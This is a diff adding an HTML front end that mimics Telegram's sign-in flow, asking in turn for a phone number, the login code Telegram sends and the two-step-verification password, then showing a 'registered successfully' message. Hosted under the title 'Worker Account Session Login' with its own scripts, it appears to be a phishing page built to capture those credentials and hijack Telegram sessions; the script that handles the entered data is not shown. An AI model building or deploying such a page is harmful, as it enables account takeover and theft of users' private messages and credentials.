@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Worker Account Session Login</title>
+  <link rel="stylesheet" href="/static/style.css?v=2.0">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+
+<body>
+  <!-- Theme Toggle Button -->
+  <button id="theme-toggle" class="theme-toggle-btn" title="Toggle dark/light mode" aria-label="Toggle theme">
+    <span id="theme-icon">🌙</span>
+  </button>
+
+  <!-- Doodle Background Pattern -->
+  <div class="bg-doodles" aria-hidden="true">
+    <span style="top:4%;left:3%">⭐</span>
+    <span style="top:8%;left:12%">✨</span>
+    <span style="top:2%;left:22%">🎁</span>
+    <span style="top:12%;left:6%">🎈</span>
+    <span style="top:18%;left:1%">🌟</span>
+    <span style="top:6%;left:88%">🎉</span>
+    <span style="top:14%;left:94%">⭐</span>
+    <span style="top:3%;left:76%">🎊</span>
+    <span style="top:22%;left:97%">✨</span>
+    <span style="top:28%;left:90%">🎈</span>
+    <span style="top:30%;left:4%">🎀</span>
+    <span style="top:40%;left:0%">✨</span>
+    <span style="top:48%;left:6%">⭐</span>
+    <span style="top:38%;left:92%">🎁</span>
+    <span style="top:50%;left:96%">🌟</span>
+    <span style="top:60%;left:2%">🎉</span>
+    <span style="top:65%;left:88%">🎊</span>
+    <span style="top:70%;left:10%">🌟</span>
+    <span style="top:75%;left:94%">⭐</span>
+    <span style="top:80%;left:5%">✨</span>
+    <span style="top:82%;left:85%">🎈</span>
+    <span style="top:88%;left:15%">🎁</span>
+    <span style="top:90%;left:78%">🎀</span>
+    <span style="top:94%;left:8%">🎉</span>
+    <span style="top:96%;left:90%">⭐</span>
+    <span style="top:92%;left:55%">✨</span>
+    <span style="top:5%;left:50%">🌟</span>
+    <span style="top:55%;left:98%">🎊</span>
+  </div>
+
+  <div class="auth-page">
+    <!-- Centered Login Box -->
+    <div class="auth-card">
+      <div class="auth-header">
+        <div class="auth-avatar">
+          <!-- ✏️ TO CHANGE THE LOGO: drop your image into c:\Users\user\Desktop\login\web\ and update the src below -->
+          <img id="site-logo" src="/static/logo.png" alt="Logo"
+            onerror="this.style.display='none';document.getElementById('logo-fallback').style.display='flex'">
+          <span id="logo-fallback" style="display:none">🔐</span>
+        </div>
+        <h2>Sign in to Telegram</h2>
+        <p id="header-subtitle">Confirm your country code and enter your phone number to authorize a new session.</p>
+      </div>
+
+      <!-- Global Alert Box -->
+      <div id="alert-box" class="alert hidden"></div>
+
+      <!-- Step 1: Phone Number -->
+      <div id="step-1" class="step-form">
+        <!-- Country Floating Input Group -->
+        <div class="custom-country-picker" id="country-picker">
+          <div class="floating-field" id="country-field">
+            <label for="country-input" class="floating-label label-country">Country</label>
+            <input type="text" id="country-input" class="floating-input" value="Ethiopia" autocomplete="off" readonly>
+            <span class="field-chevron">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                <path d="M6 9l6 6 6-6" />
+              </svg>
+            </span>
+          </div>
+          <div id="country-dropdown-menu" class="country-dropdown-menu hidden">
+            <div id="country-list" class="country-list" role="listbox"></div>
+          </div>
+        </div>
+
+        <!-- Phone Floating Input Group -->
+        <div class="floating-field mt-3">
+          <label for="phone" class="floating-label label-phone">Phone Number</label>
+          <span id="phone-prefix" class="phone-prefix">+251</span>
+          <input type="tel" id="phone" class="floating-input" placeholder="——  ———  ———">
+        </div>
+
+        <button id="btn-send-code" class="btn btn-primary mt-3">NEXT</button>
+      </div>
+
+      <!-- Step 2: Verification Code -->
+      <div id="step-2" class="step-form hidden">
+        <div class="phone-display-box">
+          <div class="phone-number-line">
+            <span id="display-phone-num">+1 365 635 5649</span>
+            <button id="btn-edit-phone" class="btn-edit-pencil" title="Edit phone number" aria-label="Edit phone number">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"></path>
+              </svg>
+            </button>
+          </div>
+          <p class="sub-text">We have sent you a message in Telegram<br>with the code.</p>
+        </div>
+
+        <div class="otp-container">
+          <input type="text" maxlength="1" class="otp-box" data-index="0" autofocus>
+          <input type="text" maxlength="1" class="otp-box" data-index="1">
+          <input type="text" maxlength="1" class="otp-box" data-index="2">
+          <input type="text" maxlength="1" class="otp-box" data-index="3">
+          <input type="text" maxlength="1" class="otp-box" data-index="4">
+        </div>
+        <input type="hidden" id="code">
+
+        <div id="otp-verifying-status" class="hidden mt-3" style="text-align:center; color:#5c9cea; font-weight:600; font-size:0.9rem;">
+          ⏳ Verifying code...
+        </div>
+      </div>
+
+      <!-- Step 3: 2FA Password -->
+      <div id="step-3" class="step-form hidden">
+        <div class="step-header-text">
+          <h2>Enter Your Password</h2>
+          <p class="sub-text">Your account is protected with an additional password</p>
+        </div>
+
+        <div class="password-input-wrapper">
+          <input type="password" id="password" class="form-input password-input" placeholder="Password" autocomplete="current-password">
+          <button type="button" id="btn-toggle-password" class="btn-toggle-password" title="Show/Hide password" aria-label="Toggle password visibility">
+            <svg id="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+              <circle cx="12" cy="12" r="3"></circle>
+            </svg>
+          </button>
+        </div>
+
+        <div class="forgot-password-wrap">
+          <a href="#" id="link-forgot-password" class="forgot-password-link">Forgot Password?</a>
+        </div>
+
+        <button id="btn-verify-2fa" class="btn btn-primary btn-next-2fa">NEXT</button>
+      </div>
+
+      <!-- Step 4: Success Card -->
+      <div id="step-success" class="step-form hidden">
+        <div class="success-box">
+          <div class="auth-avatar">
+            <img id="site-logo-success" src="/static/logo.png" alt="Logo"
+              onerror="this.style.display='none';document.getElementById('logo-fallback-success').style.display='flex'">
+            <span id="logo-fallback-success" style="display:none">🔐</span>
+          </div>
+
+          <h3>Your account has been registered successfully.</h3>
+
+          <button id="btn-reset" class="btn btn-primary mt-4">Go Back to Sign In Page</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/static/countries.js"></script>
+  <script src="/static/app.js?v=2.0"></script>
+</body>
+
+</html>
